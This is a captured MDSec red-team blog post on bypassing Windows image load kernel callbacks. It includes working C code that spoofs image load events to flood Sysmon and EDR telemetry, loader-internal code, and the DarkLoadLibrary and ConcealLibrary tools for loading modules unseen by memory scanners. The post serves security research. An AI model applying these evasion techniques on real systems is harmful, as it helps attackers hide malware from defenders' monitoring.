@@ -1,0 +1,803 @@
+# https://www.mdsec.co.uk/2021/06/bypassing-image-load-kernel-callbacks/
+
+<!DOCTYPE html><!--[if lt IE 7 ]><html lang="en-GB" class="no-js ie ie6 lte7 lte8 lte9"><![endif]--><!--[if IE 7 ]><html lang="en-GB" class="no-js ie ie7 lte7 lte8 lte9"><![endif]--><!--[if IE 8 ]><html lang="en-GB" class="no-js ie ie8 lte8 lte9"><![endif]--><!--[if IE 9 ]><html lang="en-GB" class="no-js ie ie9 lte9"><![endif]--><!--[if (gt IE 9)|!(IE)]><!--><html lang="en-GB" class=" js flexbox flexboxlegacy canvas canvastext postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg" dir="ltr"><!--<![endif]-->
+	    
+	<body class="wp-singular post-template-default single single-post postid-2635 single-format-standard wp-theme-mdsec">
+    <!--[if lt IE 7]>
+        <div class="browse-happy">
+        	 <a href="https://www.mdsec.co.uk">
+				<div id="logo">Logo</div>
+			</a>
+        	<p>You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
+        </div>    	
+    <![endif]-->              
+	
+	<!-- Site Wrapper Start --> 
+	<div class="site-wrapper">
+		
+	<!-- Header Start --> 
+	
+    <!-- Header End --> 
+		
+		
+	<div class="subnav">
+		<section class="content-wrapper">
+			<ul class="service-list clearfix">
+				<li class="item" style="">
+					<a href="https://www.mdsec.co.uk/our-services/adversary-simulation/">
+						<div class="service-icon">
+							<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/icons/icon-adversary.svg" alt="Adversary" width="300" height="150">
+						</div>
+						<hgroup>
+							<h2>
+								Adversary Simulation
+							</h2>
+						</hgroup>
+						<p>Our best in class red team can deliver a holistic cyber attack simulation to provide a true evaluation of your organisation’s cyber resilience.</p>
+						
+					</a>
+				</li>
+				<li class="item" style="">
+					<a href="https://www.mdsec.co.uk/our-services/applicaton-security/">
+						<div class="service-icon">
+							<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/icons/icon-application-security.svg" alt="Application Security" width="300" height="150">
+						</div>
+						<hgroup>
+							<h2>
+								Application <br>Security
+							</h2>
+						</hgroup>
+						<p>Leverage the team behind the industry-leading Web Application and Mobile Hacker’s Handbook series.</p>
+					</a>
+				</li>
+				<li class="item" style="">
+					<a href="https://www.mdsec.co.uk/our-services/penetration-testing/">
+						<div class="service-icon">
+							<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/icons/icon-penetration-testing.svg" alt="Penetration Testing" width="300" height="150">
+						</div>
+						<hgroup>
+							<h2>
+								Penetration <br>Testing
+							</h2>
+						</hgroup>
+						<p>MDSec’s penetration testing team is trusted by companies from the world’s leading technology firms to global financial institutions.</p>
+					</a>
+				</li>
+				<li class="item" style="">
+					<a href="https://www.mdsec.co.uk/our-services/response/">
+						<div class="service-icon">
+							<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/icons/icon-response.svg" alt="Response" width="300" height="150">
+						</div>
+						<hgroup>
+							<h2>
+								Response
+							</h2>
+						</hgroup>
+						<p>Our certified team work with customers at all stages of the Incident Response lifecycle through our range of proactive and reactive services.</p>
+					</a>
+				</li>
+			</ul>
+		</section>		
+	</div>
+	<div class="subnav-kc">
+		<section class="content-wrapper">
+			<ul class="service-list clearfix">
+				<li>
+					<a href="https://www.mdsec.co.uk/knowledge-centre/research/">
+						<hgroup>
+							<h2>
+								Research
+							</h2>
+						</hgroup>
+						<p>MDSec’s dedicated research team periodically releases white papers, blog posts, and tooling.</p>
+					</a>
+				</li>
+				<li>
+					<a href="https://www.mdsec.co.uk/knowledge-centre/training/">
+						<hgroup>
+							<h2>
+								Training
+							</h2>
+						</hgroup>
+						<p>MDSec’s training courses are informed by our security consultancy and research functions, ensuring you benefit from the latest and most applicable trends in the field.</p>
+					</a>
+				</li>
+				<li>
+					<a href="https://www.mdsec.co.uk/knowledge-centre/insights/">
+						<hgroup>
+							<h2>
+								Insights
+							</h2>
+						</hgroup>
+						<p>View insights from MDSec’s consultancy and research teams.</p>
+					</a>
+				</li>
+			</ul>
+		</section>		
+	</div>		
+
+	
+	<section class="insights-single-header">
+		<div class="content-wrapper">
+			<div class="the-category">
+			<span class="category">ActiveBreach</span>			</div>
+			<h1>Bypassing Image Load Kernel Callbacks</h1>
+		</div>
+	</section>
+
+	<section class="full-width-wrapper white pad20-120">
+		<div class="content-wrapper">
+			<div class="breadcrumb-wrapper">
+				
+			</div>	
+
+		</div>
+		
+		<div class="insights-content">
+		
+<p>As security teams continue to advance, it has become essential for attacker’s to have complete control over every part of their operation, from the infrastructure down to individual actions that occur on the endpoint. Even with this in mind, image load events have always been something I’ve tried to ignore despite the extensive view they can give into the actions on an endpoint. This was simply because they occur from inside the kernel, so there’s nothing a low privileged process can do to bypass this, right?</p>
+
+
+
+<h2 class="wp-block-heading">What are image load events</h2>
+
+
+
+<p>Before starting it’s important to have a basic understanding of what an image load event actually is and how it’s possible for a security solution to monitor them. Whenever a system driver, executable image or dynamic linked library is loaded by the operating system, the registered image load routines are triggered. It is only possible for a program to register these callbacks from a kernel driver using the&nbsp;<code>PsSetLoadImageNotifyRoutine</code>&nbsp;routine. An example of how this could be implemented is shown below.</p>
+
+
+
+<pre class="wp-block-code"><code class="hljs less"><span class="hljs-selector-tag">VOID</span>
+<span class="hljs-selector-tag">ImageLoadCallbackRoutine</span>(
+    PUNICODE_STRING FullImageName,
+    HANDLE  		ProcessId,
+    PIMAGE_INFO  	ImageInfo
+)
+{
+    <span class="hljs-selector-tag">DbgPrint</span>(
+        <span class="hljs-string">"[+] Loaded image: %wZ\n"</span>,
+        FullImageName
+    );
+        
+    <span class="hljs-selector-tag">return</span>;
+}
+
+<span class="hljs-selector-tag">NTSTATUS</span> 
+<span class="hljs-selector-tag">DriverEntry</span>(
+	PDRIVER_OBJECT  InDriverObject,
+    PUNICODE_STRING InRegistryPath
+)
+{
+    <span class="hljs-selector-tag">UNREFERENCED_PARAMETER</span>(InDriverObject);
+    <span class="hljs-selector-tag">UNREFERENCED_PARAMETER</span>(InRegistryPath);
+    
+    <span class="hljs-selector-tag">PsSetLoadImageNotifyRoutine</span>(ImageLoadCallbackRoutine);
+    
+    <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">STATUS_SUCCESS</span>;
+}</code></pre>
+
+
+
+<p>In an ideal world where you have high privileges during an operation, it would be trivial to just load a driver that would hook the&nbsp;<code>ImageLoadCallbackRoutine</code>&nbsp;function and the filter image loads we don’t wish to be reported. Unfortunately, this is uncommon during engagements, especially on the initial access phase, therefore, we must find a way to achieve similar results with limited privileges.</p>
+
+
+
+<h2 class="wp-block-heading">Triggering The Callback</h2>
+
+
+
+<p>The next logical thing to do is figure out exactly what triggers the callback. I started by writing a basic program that will call&nbsp;<code>LoadLibrary</code>, and created a WinDBG event to hit a breakpoint when the module&nbsp;<code>TestDLL.dll</code>&nbsp;is loaded and dump the call stack.</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><img fetchpriority="high" decoding="async" src="https://www.mdsec.co.uk/wp-content/uploads/2021/06/windbg-960x276.png" alt="" class="wp-image-2636" width="720" height="207"></figure>
+
+
+
+<p>It appears from the call stack that the callback is being triggered from inside of&nbsp;<code>NtMapViewOfSection</code>. The call stack is also giving us the name of some internal functions that are being called while loading the module. Examining&nbsp;<code>ntdll!LdrpMapDllNtFileName</code>&nbsp;in IDA revealed a much clearer picture of what exactly was happening under the hood.</p>
+
+
+
+<p>It begins by opening a handle to the module on disk, this handle is used to resolve the&nbsp;<code>FullImageName</code>&nbsp;argument passed to the kernel callback.</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><img decoding="async" src="https://www.mdsec.co.uk/wp-content/uploads/2021/06/ntopenfile.png" alt="" class="wp-image-2637" width="679" height="464"></figure>
+
+
+
+<p>After this,&nbsp;<code>NtCreateSection</code>&nbsp;is then called. As arguments, it uses the previously created file handle along with the allocation attribute of&nbsp;<code>SEC_IMAGE</code>. This is a special type of attribute used by the loader to, among other things, make the image executable in memory.</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><img decoding="async" src="https://www.mdsec.co.uk/wp-content/uploads/2021/06/sec_image.png" alt="" class="wp-image-2638" width="704" height="218"></figure>
+
+
+
+<p>This section handle is then passed to&nbsp;<code>LdrpMapDllWithSectionHandle</code>&nbsp;which will immediately call&nbsp;<code>LdrpMinimalMapModule</code>&nbsp;passing it a pointer to the section handle.&nbsp;<code>LdrpMapDllWithSectionHandle</code>&nbsp;will then be responsible for performing relocation’s and adding the module to various internal structures that loaded modules must be present in.</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><img loading="lazy" decoding="async" src="https://www.mdsec.co.uk/wp-content/uploads/2021/06/mapdllsectionhandle.png" alt="" class="wp-image-2639" width="299" height="83"></figure>
+
+
+
+<p>Inside&nbsp;<code>LdrpMinimalMapModule</code>&nbsp;we can see the system call to&nbsp;<code>NtMapViewOfSection</code>. As this call is handled by the kernel we have no control over any execution after this point.</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><img loading="lazy" decoding="async" src="https://www.mdsec.co.uk/wp-content/uploads/2021/06/mapviewofsection.png" alt="" class="wp-image-2640" width="542" height="159"></figure>
+
+
+
+<h2 class="wp-block-heading">Spoofing Image Loads</h2>
+
+
+
+<p>From the above analysis it’s clear that the trigger for the callback actually originates when the module’s memory is setup by the loader, not by the module being linked to the internal structures or being executed. This is bad news for us as this memory setup is vital for the execution of the module so we will not be able to avoid this behaviour. That being said, although we may be unable to bypass this mechanism, it does appear this it is possible for us to abuse it by triggering image load events for module’s that have not been loaded by a process.</p>
+
+
+
+<p>This will be relatively easy to achieve by just following the same method the windows loader does.</p>
+
+
+
+
+<ul><li>Open a handle to the module</li><li>Create a section using&nbsp;<code>SEC_IMAGE</code></li><li>Trigger the callback by mapping the section</li></ul>
+
+
+
+<p>It is important that the module you are trying to spoof exists on disk and is a valid PE. Below is some code that can spoof image load events.</p>
+
+
+
+<pre class="wp-block-code"><code class="hljs yaml"><span class="hljs-comment">#include &lt;stdio.h&gt;</span>
+<span class="hljs-comment">#include &lt;windows.h&gt;</span>
+<span class="hljs-comment">#include &lt;winternl.h&gt;</span>
+
+<span class="hljs-comment">#define DLL_TO_FAKE_LOAD L"\\??\\C:\\windows\\system32\\calc.exe"</span>
+
+<span class="hljs-string">BOOL</span> <span class="hljs-string">FakeImageLoad()</span>
+<span class="hljs-string">{</span>
+    <span class="hljs-string">HANDLE</span> <span class="hljs-string">hFile;</span>
+    <span class="hljs-string">SIZE_T</span> <span class="hljs-string">stSize</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span>
+    <span class="hljs-string">NTSTATUS</span> <span class="hljs-string">ntStatus</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span>
+    <span class="hljs-string">UNICODE_STRING</span> <span class="hljs-string">objectName;</span>
+    <span class="hljs-string">HANDLE</span> <span class="hljs-string">SectionHandle</span> <span class="hljs-string">=</span> <span class="hljs-literal">NULL</span><span class="hljs-string">;</span>
+    <span class="hljs-string">PVOID</span> <span class="hljs-string">BaseAddress</span> <span class="hljs-string">=</span> <span class="hljs-literal">NULL</span><span class="hljs-string">;</span>
+    <span class="hljs-string">IO_STATUS_BLOCK</span> <span class="hljs-string">IoStatusBlock;</span>
+    <span class="hljs-string">OBJECT_ATTRIBUTES</span> <span class="hljs-string">objectAttributes</span> <span class="hljs-string">=</span> <span class="hljs-string">{</span> <span class="hljs-number">0</span> <span class="hljs-string">};</span>
+
+    <span class="hljs-string">RtlInitUnicodeString(</span>
+        <span class="hljs-string">&amp;objectName,</span>
+        <span class="hljs-string">DLL_TO_FAKE_LOAD</span>
+    <span class="hljs-string">);</span>
+
+    <span class="hljs-string">InitializeObjectAttributes(</span>
+        <span class="hljs-string">&amp;objectAttributes,</span>
+        <span class="hljs-string">&amp;objectName,</span>
+        <span class="hljs-string">OBJ_CASE_INSENSITIVE,</span>
+        <span class="hljs-literal">NULL</span><span class="hljs-string">,</span>
+        <span class="hljs-literal">NULL</span>
+    <span class="hljs-string">);</span>
+
+    <span class="hljs-string">ntStatus</span> <span class="hljs-string">=</span> <span class="hljs-string">NtOpenFile(</span>
+        <span class="hljs-string">&amp;hFile,</span>
+        <span class="hljs-number">0x100021</span><span class="hljs-string">,</span>
+        <span class="hljs-string">&amp;objectAttributes,</span>
+        <span class="hljs-string">&amp;IoStatusBlock,</span>
+        <span class="hljs-number">5</span><span class="hljs-string">,</span>
+        <span class="hljs-number">0x60</span>
+    <span class="hljs-string">);</span>
+
+    <span class="hljs-string">ntStatus</span> <span class="hljs-string">=</span> <span class="hljs-string">NtCreateSection(</span>
+        <span class="hljs-string">&amp;SectionHandle,</span>
+        <span class="hljs-number">0xd</span><span class="hljs-string">,</span>
+        <span class="hljs-literal">NULL</span><span class="hljs-string">,</span>
+        <span class="hljs-literal">NULL</span><span class="hljs-string">,</span>
+        <span class="hljs-number">0x10</span><span class="hljs-string">,</span>
+        <span class="hljs-string">SEC_IMAGE,</span>
+        <span class="hljs-string">hFile</span>
+    <span class="hljs-string">);</span>
+
+    <span class="hljs-string">ntStatus</span> <span class="hljs-string">=</span> <span class="hljs-string">NtMapViewOfSection(</span>
+        <span class="hljs-string">SectionHandle,</span>
+        <span class="hljs-string">(HANDLE)0xFFFFFFFFFFFFFFFF,</span>
+        <span class="hljs-string">&amp;BaseAddress,</span>
+        <span class="hljs-literal">NULL</span><span class="hljs-string">,</span>
+        <span class="hljs-literal">NULL</span><span class="hljs-string">,</span>
+        <span class="hljs-literal">NULL</span><span class="hljs-string">,</span>
+        <span class="hljs-string">&amp;stSize,</span>
+        <span class="hljs-number">0x1</span><span class="hljs-string">,</span>
+        <span class="hljs-number">0x800000</span><span class="hljs-string">,</span>
+        <span class="hljs-number">0x80</span>
+    <span class="hljs-string">);</span>
+
+    <span class="hljs-string">NtClose(SectionHandle);</span>
+<span class="hljs-string">}</span>
+
+<span class="hljs-string">int</span> <span class="hljs-string">main()</span>
+<span class="hljs-string">{</span>
+    <span class="hljs-string">for</span> <span class="hljs-string">(INT</span> <span class="hljs-string">i</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span> <span class="hljs-string">i</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">10000</span><span class="hljs-string">;</span> <span class="hljs-string">i++)</span>
+    <span class="hljs-string">{</span>
+        <span class="hljs-string">FakeImageLoad();</span>
+    <span class="hljs-string">}</span>
+
+    <span class="hljs-string">return</span> <span class="hljs-number">0</span><span class="hljs-string">;</span>
+<span class="hljs-string">}</span></code></pre>
+
+
+
+<p>As can be seen below, when the program was executed it spoofed 10,000 image load events for the module&nbsp;<code>C:\Windows\System32\calc.exe</code>, but this module is never actually loaded.</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><img loading="lazy" decoding="async" src="https://www.mdsec.co.uk/wp-content/uploads/2021/06/sysmon-960x407.png" alt="" class="wp-image-2641" width="720" height="305"></figure>
+
+
+
+<h2 class="wp-block-heading">Custom Image Loader</h2>
+
+
+
+<p>I initially attempted to modify the windows image loader through a range of hooks and patches to use virtual memory instead of section mappings, but after a lot of frustration I realised I just had to bite the bullet and write my own replica of the windows image loader.</p>
+
+
+
+<p>The simplest part of the loader was actually loading and executing the module inside memory, the real challenge came when attempting to link the module to the internal structures required by&nbsp;<code>GetProcAddress</code>&nbsp;and&nbsp;<code>GetModuleHandle</code>. It was harder than I expected, mainly due to the near total lack of documentation.</p>
+
+
+
+<h3 class="wp-block-heading">Loading and executing a module</h3>
+
+
+
+<p>So although it sounds complicated, it can be easily broken down into 7 steps.</p>
+
+
+
+<ul class="wp-block-list"><li>Make sure the data you’re about to load is a valid PE</li><li>Copy headers and sections into memory, setting the correct memory permissions</li><li>If necessary perform relocation’s on the image base</li><li>Resolve both the import tables</li><li>Execute the TLS callbacks</li><li>Register the exception handlers</li><li>Call the DLL entry point (<code>DllMain</code>)</li></ul>
+
+
+
+<p>I won’t go into much more detail as there is a lot more information on this process that can be found all over the internet, but if your interested you can find my implementation&nbsp;<a href="https://github.com/bats3c/DarkLoadLibrary/blob/master/DarkLoadLibrary/src/ldrutils.c" target="_blank" rel="noreferrer noopener">here</a>.</p>
+
+
+
+<h3 class="wp-block-heading">Linking to internal structures</h3>
+
+
+
+<p>When starting out I thought I would only have to add the module to 3 lists in the PEB (<code>InLoadOrderModuleList</code>,&nbsp;<code>InMemoryOrderModuleList</code>&nbsp;and&nbsp;<code>InInitializationOrderModuleList</code>) and then set a couple other values like the module name and base address. This may have been the case with older versions of windows, but with the latest version of windows it isn’t so straight forward.</p>
+
+
+
+<p>Although there are many steps involved in linking the module the most challenging are the below steps (mainly due to locating the required structures being a pain).</p>
+
+
+
+<ul class="wp-block-list"><li>Adding the module’s hash to the hash table.</li><li>Adding the module’s base address to the base address index.</li></ul>
+
+
+
+<p>The below snippet is taken from&nbsp;<code>LdrpMapDllWithSectionHandle</code>. It shows the loader first checking if the module is locked, and if it’s not then&nbsp;<code>LdrpInsertDataTableEntry</code>&nbsp;is used to add the module to the hash table and&nbsp;<code>LdrpInsertModuleToIndexLockHeld</code>&nbsp;to add it to the base address index.</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><img loading="lazy" decoding="async" src="https://www.mdsec.co.uk/wp-content/uploads/2021/06/insertingtostructs.png" alt="" class="wp-image-2642" width="434" height="215"></figure>
+
+
+
+<p>At some point in time Microsoft decided that when searching for a module or its exports via&nbsp;<code>GetModuleHandle</code>&nbsp;or&nbsp;<code>GetProcAddress</code>, simply walking the loaded module list in the PEB and string comparing each module name with the one your searching for was too slow. So they decided to use a hash table to make this lookup faster.</p>
+
+
+
+<p>When a module is added to the hash table it is hashed via the x65599 hashing function, this is the default for&nbsp;<code>RtlHashUnicodeString</code>.</p>
+
+
+
+<p><code>LdrpHashUnicodeString</code>&nbsp;is the hashing function the windows loader uses, its cleaned up decompilation can been seen below. It takes a pointer to a&nbsp;<code>UNICODE_STRING</code>&nbsp;as an argument and if hashing was successful will return the hashed value.</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><img loading="lazy" decoding="async" src="https://www.mdsec.co.uk/wp-content/uploads/2021/06/hashunicodestr.png" alt="" class="wp-image-2643" width="399" height="162"></figure>
+
+
+
+<p>Looking inside&nbsp;<code>LdrpInsertDataTableEntry</code>&nbsp;we can see it’s using&nbsp;<code>LdrpHashUnicodeString</code>&nbsp;to hash the module name stored in the&nbsp;<code>LDR_DATA_TABLE_ENTRY</code>&nbsp;for the module, pointed to by the&nbsp;<code>pLdrEntry</code>&nbsp;variable. This hash is then passed to a bitwise AND operation with&nbsp;<code>0x1F</code>, the resulting value is used as an index for the hash table. The rest of the code is responsible for inserting the links from this index.</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><img loading="lazy" decoding="async" src="https://www.mdsec.co.uk/wp-content/uploads/2021/06/insertdatatable.png" alt="" class="wp-image-2644" width="494" height="419"></figure>
+
+
+
+<p>The problem we face when writing our own implementation is that, unlike the windows loader, we do not know the location of the&nbsp;<code>LdrpHashTable</code>&nbsp;variable. So the first thing we need to do is find it. The below function makes that possible.</p>
+
+
+
+<pre class="wp-block-code"><code class="hljs php">PLIST_ENTRY FindHashTable() {
+    PLIST_ENTRY pList = <span class="hljs-keyword">NULL</span>;
+    PLIST_ENTRY pHead = <span class="hljs-keyword">NULL</span>;
+    PLIST_ENTRY pEntry = <span class="hljs-keyword">NULL</span>;
+    PLDR_DATA_TABLE_ENTRY2 pCurrentEntry = <span class="hljs-keyword">NULL</span>;
+
+    PPEB2 pPeb = (PPEB2)READ_MEMLOC(PEB_OFFSET);
+
+	pHead = &amp;pPeb-&gt;Ldr-&gt;InInitializationOrderModuleList;
+    pEntry = pHead-&gt;Flink;
+
+    <span class="hljs-keyword">do</span>
+    {
+        pCurrentEntry = CONTAINING_RECORD(
+            pEntry,
+            LDR_DATA_TABLE_ENTRY2,
+            InInitializationOrderLinks
+        );
+
+        pEntry = pEntry-&gt;Flink;
+
+        <span class="hljs-keyword">if</span> (pCurrentEntry-&gt;HashLinks.Flink == &amp;pCurrentEntry-&gt;HashLinks)
+        {
+            <span class="hljs-keyword">continue</span>;
+        }
+
+        pList = pCurrentEntry-&gt;HashLinks.Flink;
+
+        <span class="hljs-keyword">if</span> (pList-&gt;Flink == &amp;pCurrentEntry-&gt;HashLinks)
+        {
+            ULONG ulHash = LdrHashEntry(
+                pCurrentEntry-&gt;BaseDllName,
+                <span class="hljs-keyword">TRUE</span>
+            );
+
+            pList = (PLIST_ENTRY)(
+                (SIZE_T)pCurrentEntry-&gt;HashLinks.Flink -
+                ulHash *
+                sizeof(LIST_ENTRY)
+            );
+
+			<span class="hljs-keyword">break</span>;
+		}
+
+        pList = <span class="hljs-keyword">NULL</span>;
+    } <span class="hljs-keyword">while</span> (pHead != pEntry);
+
+    <span class="hljs-keyword">return</span> pList;
+}
+</code></pre>
+
+
+
+<p>Now that we have the location of the hash table, all that needs to be done is inserting the module hash into it. Adding the hash can be done easily with the below&nbsp;<code>InsertTailList</code>&nbsp;function.</p>
+
+
+
+<pre class="wp-block-code"><code class="hljs php">VOID InsertTailList(
+    PLIST_ENTRY ListHead,
+    PLIST_ENTRY Entry
+)
+{
+    PLIST_ENTRY Blink;
+
+    Blink = ListHead-&gt;Blink;
+    Entry-&gt;Flink = ListHead;
+    Entry-&gt;Blink = Blink;
+    Blink-&gt;Flink = Entry;
+    ListHead-&gt;Blink = Entry;
+
+    <span class="hljs-keyword">return</span>;
+}</code></pre>
+
+
+
+<p>Looking inside&nbsp;<code>LdrpInsertModuleToIndexLockHeld</code>&nbsp;we can see the base address index is stored in the&nbsp;<code>LdrpModuleBaseAddressIndex</code>&nbsp;variable. After some initialisation and sanity checks occur,&nbsp;<code>RtlRbInsertNodeEx</code>&nbsp;is used to insert the modules base address into the Red Black tree.</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><img loading="lazy" decoding="async" src="https://www.mdsec.co.uk/wp-content/uploads/2021/06/insertbaseindex.png" alt="" class="wp-image-2645" width="517" height="554"></figure>
+
+
+
+<p>It is possible to locate&nbsp;<code>LdrpModuleBaseAddressIndex</code>&nbsp;tree by searching the&nbsp;<code>.data</code>&nbsp;section of the already loaded&nbsp;<code>ntdll.dll</code>&nbsp;module.</p>
+
+
+
+<pre class="wp-block-code"><code class="hljs php">PRTL_RB_TREE FindModuleBaseAddressIndex()
+{
+    SIZE_T stEnd = <span class="hljs-keyword">NULL</span>;
+    PRTL_BALANCED_NODE pNode = <span class="hljs-keyword">NULL</span>;
+    PRTL_RB_TREE pModBaseAddrIndex = <span class="hljs-keyword">NULL</span>;
+
+    PLDR_DATA_TABLE_ENTRY2 pLdrEntry = FindLdrTableEntry(L<span class="hljs-string">"ntdll.dll"</span>);
+
+    pNode = &amp;pLdrEntry-&gt;BaseAddressIndexNode;
+
+    <span class="hljs-keyword">do</span>
+    {
+        pNode = (PRTL_BALANCED_NODE)(pNode-&gt;ParentValue &amp; (~<span class="hljs-number">7</span>));
+    } <span class="hljs-keyword">while</span> (pNode-&gt;ParentValue &amp; (~<span class="hljs-number">7</span>));
+
+    <span class="hljs-keyword">if</span> (!pNode-&gt;Red)
+    {
+        DWORD dwLen = <span class="hljs-keyword">NULL</span>;
+        SIZE_T stBegin = <span class="hljs-keyword">NULL</span>;
+
+        PIMAGE_NT_HEADERS pNtHeaders = RVA(
+            PIMAGE_NT_HEADERS, 
+            pLdrEntry-&gt;DllBase, 
+            ((PIMAGE_DOS_HEADER)pLdrEntry-&gt;DllBase)-&gt;e_lfanew
+        );
+
+        PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
+
+        <span class="hljs-keyword">for</span> (INT i = <span class="hljs-number">0</span>; i &lt; pNtHeaders-&gt;FileHeader.NumberOfSections; i++)
+        {
+            <span class="hljs-keyword">if</span> (!strcmp(<span class="hljs-string">".data"</span>, (LPCSTR)pSection-&gt;Name))
+            {
+                stBegin = (SIZE_T)pLdrEntry-&gt;DllBase + pSection-&gt;VirtualAddress;
+                dwLen = pSection-&gt;Misc.VirtualSize;
+
+                <span class="hljs-keyword">break</span>;
+            }
+
+            ++pSection;
+        }
+
+        <span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; dwLen - sizeof(SIZE_T); ++stBegin, ++i) 
+        {
+
+            SIZE_T stRet = RtlCompareMemory(
+                (PVOID)stBegin, 
+                (PVOID)&amp;pNode, 
+                sizeof(SIZE_T)
+            );
+
+            <span class="hljs-keyword">if</span> (stRet == sizeof(SIZE_T)) 
+            {
+                stEnd = stBegin;
+                <span class="hljs-keyword">break</span>;
+            }
+        }
+
+        <span class="hljs-keyword">if</span> (stEnd == <span class="hljs-keyword">NULL</span>)
+        {
+            <span class="hljs-keyword">return</span> <span class="hljs-keyword">NULL</span>;
+        }
+
+        PRTL_RB_TREE pTree = (PRTL_RB_TREE)stEnd;
+        
+        <span class="hljs-keyword">if</span> (pTree &amp;&amp; pTree-&gt;Root &amp;&amp; pTree-&gt;Min)
+        {
+            pModBaseAddrIndex = pTree;
+        }
+    }
+    
+    <span class="hljs-keyword">return</span> pModBaseAddrIndex;
+}</code></pre>
+
+
+
+<h2 class="wp-block-heading">Introducing DarkLoadLibrary</h2>
+
+
+
+<p>In essence,&nbsp;<code>DarkLoadLibrary</code>&nbsp;is an implementation of&nbsp;<code>LoadLibrary</code>&nbsp;that will not trigger image load events. It also has a ton of extra features that will make life easier during malware development.</p>
+
+
+
+<p>A simple overview can be seen below:</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><img loading="lazy" decoding="async" src="https://www.mdsec.co.uk/wp-content/uploads/2021/06/evaluation-960x485.jpg" alt="" class="wp-image-2646" width="720" height="364"></figure>
+
+
+
+<p>In my personal opinion I believe that it can be used to replace the use of Reflective DLLs in most situations. Below is an example of loading a local module, then locating a function with&nbsp;<code>GetProcAddress</code>&nbsp;and calling it.</p>
+
+
+
+<pre class="wp-block-code"><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;darkloadlibrary.h&gt;</span></span>
+
+<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span> <span class="hljs-params">(WINAPI * _ThisIsAFunction)</span> <span class="hljs-params">(LPCWSTR)</span></span>;
+
+<span class="hljs-function">VOID <span class="hljs-title">main</span><span class="hljs-params">()</span>
+</span>{
+	DARKMODULE DarkModule = DarkLoadLibrary(
+		LOAD_LOCAL_FILE,
+		<span class="hljs-string">L"TestDLL.dll"</span>,
+		<span class="hljs-number">0</span>,
+		<span class="hljs-literal">NULL</span>
+	);
+
+	<span class="hljs-keyword">if</span> (!DarkModule.bSuccess)
+	{
+		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Load Error: %S\n"</span>, DarkModule.ErrorMsg);
+		<span class="hljs-keyword">return</span>;
+	}
+
+	_ThisIsAFunction ThisIsAFunction = GetProcAddress(
+		DarkModule.ModuleBase,
+		<span class="hljs-string">"CallThisFunction"</span>
+	);
+
+	<span class="hljs-keyword">if</span> (!ThisIsAFunction)
+	{
+		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Failed to locate function\n"</span>);
+		<span class="hljs-keyword">return</span>;
+	}
+
+    ThisIsAFunction(<span class="hljs-string">L"this is working!!!"</span>);
+
+	<span class="hljs-keyword">return</span>;
+}</code></pre>
+
+
+
+<p><code>DarkLoadLibrary</code>&nbsp;is also capable of loading files from memory with the&nbsp;<code>LOAD_MEMORY</code>&nbsp;flag.</p>
+
+
+
+<p>As having a module linked to the PEB which is either not backed on disk or is completely different to the one on disk is a pretty big IOC for most memory scanners, therefore I have also created&nbsp;<code>ConcealLibrary</code>. If you give this function a pointer to a&nbsp;<code>DARKMODULE</code>&nbsp;structure it will remove all this module’s entries from the PEB, remove the execute permission from all of the modules mapped sections and then encrypt all the sections and headers. This will conceal the module from any memory scanners. For optimum operation security you should always keep any libraries that are not being used in a concealed state. Modules can be unconcealed and ready for use with another call to&nbsp;<code>ConcealLibrary</code>.</p>
+
+
+
+<p>You can download&nbsp;<code>DarkLoadLibrary</code>&nbsp;from&nbsp;<a href="https://github.com/bats3c/DarkLoadLibrary">here</a>.</p>
+
+
+
+<p>I would like to thank Nick Landers (<a href="https://twitter.com/monoxgas">@monoxgas</a>) for his great work on&nbsp;<a href="https://github.com/monoxgas/sRDI">sRDI</a>&nbsp;and&nbsp;<a href="mailto:1079299053@qq.com">bb107</a>&nbsp;for their work on&nbsp;<a href="https://github.com/bb107/MemoryModulePP">MemoryModulePP</a>, which although I couldn’t get it working, did contain very valuable information on some of the internal PEB structures. So make sure you check out both of these projects.</p>
+
+
+
+<p>Thanks for sticking around to the end, if you have any questions feel free to get in contact.</p>
+
+
+
+<p>This blog post was written by Dylan (<a href="https://twitter.com/_batsec_">@<em>batsec</em></a>).</p>
+		</div>
+		
+		<div class="author">
+			<div class="content-wrapper clearfix">
+				<div class="author-avatar">
